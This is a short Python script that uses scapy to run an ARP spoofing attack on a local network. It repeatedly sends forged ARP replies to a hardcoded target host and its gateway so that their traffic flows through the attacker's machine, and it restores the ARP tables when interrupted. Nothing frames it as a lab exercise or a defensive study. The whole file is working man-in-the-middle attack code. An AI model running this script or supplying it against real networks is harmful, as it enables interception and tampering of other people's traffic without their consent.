import scapy.all as scapy
import time


def restore(tar_ip, source_ip):
    tar_mac = get_mac(tar_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(tar_ip, spoof_ip):
    tar_mac = get_mac(tar_ip)
    packet = scapy.ARP(op=2, pdst=tar_ip, hwdst=tar_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)


packet_count = 0
target_ip = "192.168.29.234"
gateway_ip = "192.168.29.1"
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_count += 2
        print("\r[+]Packet send : " + str(packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Restoring (ctrl-c detected)")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
